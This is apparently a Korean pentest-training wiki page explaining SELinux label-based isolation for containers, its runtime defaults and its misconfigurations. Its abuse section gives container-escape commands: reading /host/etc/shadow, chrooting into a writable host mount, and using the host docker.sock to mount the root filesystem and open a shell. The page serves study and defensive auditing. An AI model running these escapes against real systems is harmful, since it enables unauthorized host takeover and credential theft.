# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

SELinux는 **레이블 기반의 Mandatory Access Control** 시스템입니다. 관련된 모든 프로세스와 객체는 보안 컨텍스트를 가질 수 있으며, 정책은 어떤 도메인이 어떤 타입과 어떻게 상호작용할 수 있는지를 결정합니다. 컨테이너화된 환경에서는 보통 런타임이 컨테이너 프로세스를 제한된 container 도메인 아래에서 실행하고 컨테이너 내용에 해당 타입 라벨을 붙인다는 의미입니다. 정책이 제대로 작동하면, 프로세스는 자신의 라벨이 접근하도록 예상된 항목들을 읽고 쓸 수 있지만, 마운트를 통해 해당 콘텐츠가 보이게 되더라도 다른 호스트 콘텐츠에 대한 접근은 거부됩니다.

이것은 주류 Linux 컨테이너 배포에서 사용 가능한 가장 강력한 호스트 측 보호장치 중 하나입니다. Fedora, RHEL, CentOS Stream, OpenShift 및 기타 SELinux 중심 생태계에서는 특히 중요합니다. 그러한 환경에서 SELinux를 무시하는 리뷰어는 겉으로 보기에는 명백해 보이는 호스트 침해 경로가 실제로 차단되는 이유를 종종 오해하게 됩니다.

## AppArmor Vs SELinux

가장 쉬운 상위 수준의 차이는 AppArmor가 경로(path)-기반인 반면 SELinux는 **레이블 기반**이라는 점입니다. 이것은 컨테이너 보안에 큰 영향을 미칩니다. 경로 기반 정책은 동일한 호스트 콘텐츠가 예상치 못한 마운트 경로 아래에 노출되면 다르게 동작할 수 있습니다. 레이블 기반 정책은 대신 객체의 레이블이 무엇인지와 프로세스 도메인이 그 대상에 대해 무엇을 할 수 있는지를 묻습니다. 이것이 SELinux를 단순하게 만들지는 않지만, AppArmor 기반 시스템에서 방어자가 가끔 실수로 하는 경로 관련 가정(path-trick assumption) 범주에 대해서는 더 강인합니다.

모델이 레이블 지향이기 때문에, 컨테이너 볼륨 처리와 재라벨링(relabeling) 결정은 보안상 매우 중요합니다. 런타임이나 운영자가 마운트를 "작동하게 하기 위해" 라벨을 지나치게 광범위하게 변경하면, 워크로드를 격리하기 위해 설정된 정책 경계가 의도한 것보다 훨씬 약해질 수 있습니다.

## 실습

호스트에서 SELinux가 활성화되어 있는지 확인하려면:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
호스트의 기존 레이블을 확인하려면:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
레이블링이 비활성화된 실행과 정상 실행을 비교하려면:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## 런타임 사용법

Podman은 SELinux가 플랫폼 기본값의 일부인 시스템에서 특히 SELinux와 잘 맞습니다. Rootless Podman과 SELinux의 조합은 프로세스가 이미 호스트 측에서 비권한화되어 있고 MAC 정책에 의해 여전히 제약되기 때문에 가장 강력한 일반 컨테이너 기준선 중 하나입니다. Docker도 지원되는 환경에서는 SELinux를 사용할 수 있지만, 관리자는 때때로 볼륨 라벨링 문제를 우회하기 위해 이를 비활성화하곤 합니다. CRI-O와 OpenShift는 컨테이너 격리 수단의 일부로 SELinux에 크게 의존합니다. Kubernetes도 SELinux 관련 설정을 노출할 수 있지만, 그 유효성은 노드 OS가 실제로 SELinux를 지원하고 강제하는지에 따라 달라집니다.

반복되는 교훈은 SELinux가 선택적 장식이 아니라는 점입니다. 그것을 중심으로 구축된 생태계에서는 기대되는 보안 경계의 일부입니다.

## 잘못된 구성

전형적인 실수는 `label=disable`입니다. 운영상으로는, 종종 볼륨 마운트가 거부되어 라벨링 모델을 수정하는 대신 단기적으로 가장 빠른 해결책으로 SELinux를 제거하는 경우가 발생합니다. 또 다른 흔한 실수는 호스트 콘텐츠를 잘못 재라벨하는 것입니다. 광범위한 재라벨 작업은 애플리케이션이 동작하도록 만들 수 있지만, 컨테이너가 접근할 수 있는 범위를 원래 의도보다 훨씬 넓게 확장시킬 수 있습니다.

설치된(installed) SELinux와 실효(effective) SELinux를 혼동하지 않는 것도 중요합니다. 호스트는 SELinux를 지원하지만 여전히 permissive 모드에 있을 수 있고, 런타임이 워크로드를 예상된 도메인 아래에서 실행하지 않을 수도 있습니다. 그런 경우 보호 수준은 문서에서 제시한 것보다 훨씬 약합니다.

## 악용

SELinux가 없거나 permissive 모드이거나 워크로드에 대해 넓게 비활성화된 경우, 호스트에 마운트된 경로는 훨씬 더 쉽게 악용될 수 있습니다. 라벨로 제약되었을 동일한 bind mount가 호스트 데이터에 접근하거나 호스트를 수정하는 직접적인 통로가 될 수 있습니다. 이는 특히 쓰기 가능한 볼륨 마운트, container runtime 디렉터리, 또는 편의를 위해 민감한 호스트 경로를 노출한 운영상의 단축과 결합될 때 중요합니다.

SELinux는 일반적인 탈출 브레이크아웃(writeup)이 런타임 플래그는 비슷해 보이는데도 한 호스트에서는 즉시 통하고 다른 호스트에서는 반복적으로 실패하는 이유를 설명하는 경우가 많습니다. 빠진 요소는 자주 namespace나 capability가 아니라, 온전하게 유지된 라벨 경계(label boundary)입니다.

가장 빠른 실용적 점검은 활성 컨텍스트를 비교한 다음, 보통 라벨에 의해 제한되는 마운트된 호스트 경로나 런타임 디렉터리를 탐침하는 것입니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
호스트 bind mount가 존재하고 SELinux 라벨링이 비활성화되었거나 약화된 경우, 정보 노출이 종종 먼저 발생합니다:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
마운트가 쓰기 가능하고 컨테이너가 커널 관점에서 사실상 호스트의 root라면, 다음 단계는 추측하는 대신 제어된 호스트 수정을 테스트하는 것입니다:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux를 지원하는 호스트에서는 런타임 상태 디렉터리 주변의 레이블이 손실되는 경우에도 직접적인 privilege-escalation 경로가 노출될 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
이 명령들은 완전한 이스케이프 체인을 대체하지는 않지만, SELinux가 호스트 데이터 접근이나 호스트 측 파일 수정을 차단하고 있었는지 매우 빠르게 확인해줍니다.

### 전체 예: SELinux 비활성화 + 쓰기 가능한 호스트 마운트

SELinux 라벨링이 비활성화되어 있고 호스트 파일시스템이 `/host`에 쓰기 가능 상태로 마운트되어 있다면, 전체 호스트 이스케이프는 일반적인 bind-mount 악용 사례가 됩니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
만약 `chroot`가 성공하면, 컨테이너 프로세스는 이제 호스트 파일 시스템에서 동작합니다:
```bash
id
hostname
cat /etc/passwd | tail
```
### 전체 예제: SELinux 비활성화 + 런타임 디렉터리

레이블이 비활성화된 후 워크로드가 런타임 소켓에 접근할 수 있다면, 탈출은 런타임에 위임될 수 있다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
관련 관찰은 SELinux가 종종 정확히 이러한 종류의 host-path 또는 runtime-state 접근을 차단하는 제어였다는 점이다.

## 확인

SELinux 확인의 목적은 SELinux가 활성화되어 있는지 확인하고, 현재 보안 컨텍스트를 식별하며, 관심 있는 파일이나 경로가 실제로 label-confined되어 있는지 확인하는 것이다.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
여기서 주목할 점:

- `getenforce`는 이상적으로 `Enforcing`을 반환해야 합니다; `Permissive` 또는 `Disabled`는 SELinux 섹션 전체의 의미를 바꿉니다.
- 현재 프로세스 컨텍스트가 예상과 다르거나 지나치게 광범위해 보이면, workload가 의도된 container policy 하에서 실행되고 있지 않을 수 있습니다.
- 호스트에 마운트된 파일이나 런타임 디렉토리의 라벨을 프로세스가 지나치게 자유롭게 접근할 수 있다면, bind mounts는 훨씬 더 위험해집니다.

SELinux를 지원하는 플랫폼에서 container를 검토할 때 라벨링을 부차적인 세부사항으로 취급하지 마십시오. 많은 경우 라벨링은 호스트가 아직 침해되지 않은 주요 이유 중 하나입니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 호스트에 따라 다름 | SELinux가 활성화된 호스트에서는 SELinux 분리가 가능하지만, 정확한 동작은 호스트/데몬 구성에 따라 달라집니다 | `--security-opt label=disable`, bind mounts의 광범위한 라벨 재지정, `--privileged` |
| Podman | SELinux 호스트에서 일반적으로 활성화됨 | SELinux 분리는 비활성화되지 않는 한 SELinux 시스템에서 Podman의 정상적인 부분입니다 | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | 일반적으로 Pod 수준에서 자동으로 할당되지 않음 | SELinux 지원은 존재하지만, Pods는 보통 `securityContext.seLinuxOptions` 또는 플랫폼별 기본값이 필요합니다; 런타임과 노드의 지원도 필요합니다 | 약하거나 광범위한 `seLinuxOptions`, permissive/disabled 노드에서의 실행, 라벨링을 비활성화하는 플랫폼 정책 |
| CRI-O / OpenShift style deployments | 대개 크게 의존됨 | SELinux는 이러한 환경에서 노드 격리 모델의 핵심 요소인 경우가 많습니다 | 접근을 과도하게 확장하는 사용자 지정 정책, 호환성 때문에 라벨링 비활성화 |

SELinux의 기본값은 seccomp의 기본값보다 배포판에 더 의존적입니다. Fedora/RHEL/OpenShift 스타일 시스템에서는 SELinux가 격리 모델의 중심인 경우가 많습니다. SELinux가 없는 시스템에서는 단순히 존재하지 않습니다.
